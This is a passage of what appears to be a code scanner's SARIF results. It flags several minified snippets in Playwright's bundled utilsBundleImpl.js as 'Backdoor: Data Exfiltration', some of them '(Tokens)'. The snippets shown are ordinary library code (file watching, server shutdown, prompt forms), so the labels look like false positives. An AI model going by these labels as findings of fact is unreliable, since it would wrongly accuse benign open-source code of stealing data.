                      "markdown": "`,c(l)}catch{}else c(l)}),o={listeners:s,errHandlers:n,rawEmitters:u,watcher:a},_r.set(e,o)}return()=>{kt(o,Et,s),kt(o,ys,n),kt(o,Nt,u),ul(o.listeners)&&(o.watcher.close(),_r.delete(e),Jd.forEach(cp(o)),o.watcher=void 0,Object.freeze(o))}},_s=new Map,fp=(r,e,t,i)=>{let{listener:s,rawEmitter:n}=i,u=_s.get(e),o=new Set,a=new Set,l=u&&u.options;return l&&(l.persistent<t.persistent||l.interval>t.interval)&&(o=u.listeners,a=u.rawEmitters,Me.unwatchFile(e),u=void 0),u?(It(u,Et,s),It(u,Nt,n)):(u={listeners:s,rawEmitters:n,options:t,watcher:Me.watchFile(e,t,(c,h)=>{bs(u.rawEmitters,p=>{p(wr,e,{curr:c,prev:h`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 8044,
                  "endLine": 52,
                  "endColumn": 8049,
                  "snippet": {
                    "text": "===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(null,e,ys);if(o.watcherUnusable=!0,Yd&&l.code===\"EPERM\")try{let h=await up(r,\"r\");await ap(h),c(l)}ca",
                    "rendered": {
                      "text": "===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(null,e,ys);if(o.watcherUnusable=!0,Yd&&l.code===\"EPERM\")try{let h=await up(r,\"r\");await ap(h),c(l)}ca",
                      "markdown": "`===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(null,e,ys);if(o.watcherUnusable=!0,Yd&&l.code===\"EPERM\")try{let h=await up(r,\"r\");await ap(h),c(l)}ca`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 7946,
                  "endLine": 52,
                  "endColumn": 7951,
                  "snippet": {
                    "text": "r,e,t)=>{let i=r[e];i instanceof Set?i.delete(t):i===t&&delete r[e]},ul=r=>r instanceof Set?r.size===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(nul",
                    "rendered": {
                      "text": "r,e,t)=>{let i=r[e];i instanceof Set?i.delete(t):i===t&&delete r[e]},ul=r=>r instanceof Set?r.size===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(nul",
                      "markdown": "`r,e,t)=>{let i=r[e];i instanceof Set?i.delete(t):i===t&&delete r[e]},ul=r=>r instanceof Set?r.size===0:!r,_r=new Map;function il(r,e,t,i,s){let n=(u,o)=>{t(r),s(u,o,{watchedPath:r}),o&&r!==o&&br(se.resolve(r,o),Et,se.join(r,o))};try{return Me.watch(r,e,n)}catch(u){i(u)}}var br=(r,e,t,i,s)=>{let n=_r.get(r);n&&bs(n[e],u=>{u(t,i,s)})},hp=(r,e,t,i)=>{let{listener:s,errHandler:n,rawEmitter:u}=i,o=_r.get(e),a;if(!t.persistent)return a=il(r,t,s,n,u),a.close.bind(a);if(o)It(o,Et,s),It(o,ys,n),It(o,Nt,u);else{if(a=il(r,t,br.bind(null,e,Et),n,br.bind(null,e,Nt)),!a)return;a.on(sl,async l=>{let c=br.bind(nul`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 828,
                  "endLine": 33,
                  "endColumn": 833,
                  "snippet": {
                    "text": "u,present:s};default:throw new Error(`Invalid action: \"${r}\"`)}}});var Pi=y((lD,zu)=>{\"use strict\";var Mh=tt(),Uu=Wu(),Ti=class extends Mh{constructor(e){super(e);let t=this.options.history;if(t&&t.store){let i=t.values||this.initial;this.autosave=!!t.autosave,this.store=t.store,this.data=this.store.get(\"values\")||{past:[],present:i},this.initial=this.data.present||this.data.past[this.data.past.length-1]}}completion(e){return this.store?(this.data=Uu(e,this.data,this.input),this.data.present?(this.input=this.data.present,this.cursor=this.input.length,this.render()):this.alert()):this.alert()}altUp(",
                    "rendered": {
                      "text": "u,present:s};default:throw new Error(`Invalid action: \"${r}\"`)}}});var Pi=y((lD,zu)=>{\"use strict\";var Mh=tt(),Uu=Wu(),Ti=class extends Mh{constructor(e){super(e);let t=this.options.history;if(t&&t.store){let i=t.values||this.initial;this.autosave=!!t.autosave,this.store=t.store,this.data=this.store.get(\"values\")||{past:[],present:i},this.initial=this.data.present||this.data.past[this.data.past.length-1]}}completion(e){return this.store?(this.data=Uu(e,this.data,this.input),this.data.present?(this.input=this.data.present,this.cursor=this.input.length,this.render()):this.alert()):this.alert()}altUp(",
                      "markdown": "`u,present:s};default:throw new Error(`Invalid action: \"${r}\"`)}}});var Pi=y((lD,zu)=>{\"use strict\";var Mh=tt(),Uu=Wu(),Ti=class extends Mh{constructor(e){super(e);let t=this.options.history;if(t&&t.store){let i=t.values||this.initial;this.autosave=!!t.autosave,this.store=t.store,this.data=this.store.get(\"values\")||{past:[],present:i},this.initial=this.data.present||this.data.past[this.data.past.length-1]}}completion(e){return this.store?(this.data=Uu(e,this.data,this.input),this.data.present?(this.input=this.data.present,this.cursor=this.input.length,this.render()):this.alert()):this.alert()}altUp(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 1939,
                  "endLine": 19,
                  "endColumn": 1944,
                  "snippet": {
                    "text": "efined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=",
                    "rendered": {
                      "text": "efined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=",
                      "markdown": "`efined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()=>{t.forEach((c,h)=>h.destroy())})}}});var Qn=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 1893,
                  "endLine": 19,
                  "endColumn": 1898,
                  "snippet": {
                    "text": "e(\"https\");Un.exports=(r,e)=>{e=typeof e==\"undefined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()",
                    "rendered": {
                      "text": "e(\"https\");Un.exports=(r,e)=>{e=typeof e==\"undefined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()",
                      "markdown": "`e(\"https\");Un.exports=(r,e)=>{e=typeof e==\"undefined\"?1/0:e;let t=new Map,i=!1,s=!0;return r instanceof Mc.Server?r.on(\"secureConnection\",n):r.on(\"connection\",n),r.on(\"request\",u),r.stop=o,r._pendingSockets=t,r;function n(c){t.set(c,0),c.once(\"close\",()=>t.delete(c))}function u(c,h){t.set(c.socket,t.get(c.socket)+1),h.once(\"finish\",()=>{let f=t.get(c.socket)-1;t.set(c.socket,f),i&&f===0&&c.socket.end()})}function o(c){setImmediate(()=>{i=!0,e<1/0&&setTimeout(l,e).unref(),r.close(h=>{c&&c(h,s)}),t.forEach(a)})}function a(c,h){c===0&&h.end()}function l(){s=!1,t.forEach((c,h)=>h.end()),setImmediate(()`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 6105,
                  "endLine": 16,
                  "endColumn": 6110,
                  "snippet": {
                    "text": "),s=Ye?this.has(e):Ur.call(this._set,i),n=this._array.length;(!s||t)&&this._array.push(e),s||(Ye?this._set.set(e,n):this._set[i]=n)};Ne.prototype.has=function(e){if(Ye)return this._set.has(e);var t=Wr.toSetString(e);return Ur.call(this._set,t)};Ne.prototype.indexOf=function(e){if(Ye){var t=this._set.get(e);if(t>=0)return t}else{var i=Wr.toSetString(e);if(Ur.call(this._set,i))return this._set[i]}throw new Error('\"'+e+'\" is not in the set.')};Ne.prototype.at=function(e){if(e>=0&&e<this._array.length)return this._array[e];throw new Error(\"No element indexed by \"+e)};Ne.prototype.toArray=function(){ret",
                    "rendered": {
                      "text": "),s=Ye?this.has(e):Ur.call(this._set,i),n=this._array.length;(!s||t)&&this._array.push(e),s||(Ye?this._set.set(e,n):this._set[i]=n)};Ne.prototype.has=function(e){if(Ye)return this._set.has(e);var t=Wr.toSetString(e);return Ur.call(this._set,t)};Ne.prototype.indexOf=function(e){if(Ye){var t=this._set.get(e);if(t>=0)return t}else{var i=Wr.toSetString(e);if(Ur.call(this._set,i))return this._set[i]}throw new Error('\"'+e+'\" is not in the set.')};Ne.prototype.at=function(e){if(e>=0&&e<this._array.length)return this._array[e];throw new Error(\"No element indexed by \"+e)};Ne.prototype.toArray=function(){ret",
                      "markdown": "`),s=Ye?this.has(e):Ur.call(this._set,i),n=this._array.length;(!s||t)&&this._array.push(e),s||(Ye?this._set.set(e,n):this._set[i]=n)};Ne.prototype.has=function(e){if(Ye)return this._set.has(e);var t=Wr.toSetString(e);return Ur.call(this._set,t)};Ne.prototype.indexOf=function(e){if(Ye){var t=this._set.get(e);if(t>=0)return t}else{var i=Wr.toSetString(e);if(Ur.call(this._set,i))return this._set[i]}throw new Error('\"'+e+'\" is not in the set.')};Ne.prototype.at=function(e){if(e>=0&&e<this._array.length)return this._array[e];throw new Error(\"No element indexed by \"+e)};Ne.prototype.toArray=function(){ret`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 1162,
                  "endLine": 51,
                  "endColumn": 1170,
                  "snippet": {
                    "text": "defineExport(Yi,r,e),_o.defineExport(Yi,r.toLowerCase(),e)};ee(\"AutoComplete\",()=>Ru());ee(\"BasicAuth\",()=>Iu());ee(\"Confirm\",()=>$u());ee(\"Editable\",()=>qu());ee(\"Form\",()=>nr());ee(\"Input\",()=>Pi());ee(\"Invisible\",()=>Ku());ee(\"List\",()=>Qu());ee(\"MultiSelect\",()=>Zu());ee(\"Numeral\",()=>to());ee(\"Password\",()=>io());ee(\"Scale\",()=>uo());ee(\"Select\",()=>We());ee(\"Snippet\",()=>ho());ee(\"Sort\",()=>po());ee(\"Survey\",()=>go());ee(\"Text\",()=>Eo());ee(\"Toggle\",()=>Ao());ee(\"Quiz\",()=>wo())});var Fo=y((vD,vo)=>{vo.exports={ArrayPrompt:St(),AuthPrompt:Si(),BooleanPrompt:ur(),NumberPrompt:$i(),StringPrompt:tt",
                    "rendered": {
                      "text": "defineExport(Yi,r,e),_o.defineExport(Yi,r.toLowerCase(),e)};ee(\"AutoComplete\",()=>Ru());ee(\"BasicAuth\",()=>Iu());ee(\"Confirm\",()=>$u());ee(\"Editable\",()=>qu());ee(\"Form\",()=>nr());ee(\"Input\",()=>Pi());ee(\"Invisible\",()=>Ku());ee(\"List\",()=>Qu());ee(\"MultiSelect\",()=>Zu());ee(\"Numeral\",()=>to());ee(\"Password\",()=>io());ee(\"Scale\",()=>uo());ee(\"Select\",()=>We());ee(\"Snippet\",()=>ho());ee(\"Sort\",()=>po());ee(\"Survey\",()=>go());ee(\"Text\",()=>Eo());ee(\"Toggle\",()=>Ao());ee(\"Quiz\",()=>wo())});var Fo=y((vD,vo)=>{vo.exports={ArrayPrompt:St(),AuthPrompt:Si(),BooleanPrompt:ur(),NumberPrompt:$i(),StringPrompt:tt",
                      "markdown": "`defineExport(Yi,r,e),_o.defineExport(Yi,r.toLowerCase(),e)};ee(\"AutoComplete\",()=>Ru());ee(\"BasicAuth\",()=>Iu());ee(\"Confirm\",()=>$u());ee(\"Editable\",()=>qu());ee(\"Form\",()=>nr());ee(\"Input\",()=>Pi());ee(\"Invisible\",()=>Ku());ee(\"List\",()=>Qu());ee(\"MultiSelect\",()=>Zu());ee(\"Numeral\",()=>to());ee(\"Password\",()=>io());ee(\"Scale\",()=>uo());ee(\"Select\",()=>We());ee(\"Snippet\",()=>ho());ee(\"Sort\",()=>po());ee(\"Survey\",()=>go());ee(\"Text\",()=>Eo());ee(\"Toggle\",()=>Ao());ee(\"Quiz\",()=>wo())});var Fo=y((vD,vo)=>{vo.exports={ArrayPrompt:St(),AuthPrompt:Si(),BooleanPrompt:ur(),NumberPrompt:$i(),StringPrompt:tt`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6234,
                  "endLine": 30,
                  "endColumn": 6242,
                  "snippet": {
                    "text": ")}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"use strict\";var Sh=dt(),{isPrimitive:Rh,hasCol",
                    "rendered": {
                      "text": ")}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"use strict\";var Sh=dt(),{isPrimitive:Rh,hasCol",
                      "markdown": "`)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"use strict\";var Sh=dt(),{isPrimitive:Rh,hasCol`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6190,
                  "endLine": 30,
                  "endColumn": 6198,
                  "snippet": {
                    "text": "bmit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"us",
                    "rendered": {
                      "text": "bmit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"us",
                      "markdown": "`bmit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var ur=y((sD,ku)=>{\"us`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6171,
                  "endLine": 30,
                  "endColumn": 6179,
                  "snippet": {
                    "text": "tate),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var",
                    "rendered": {
                      "text": "tate),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var",
                      "markdown": "`tate),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...s,choices:e})}static create(s){return Pu(s)}}return t};Nu.exports=Pu()});var`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6095,
                  "endLine": 30,
                  "endColumn": 6103,
                  "snippet": {
                    "text": "r(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...",
                    "rendered": {
                      "text": "r(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...",
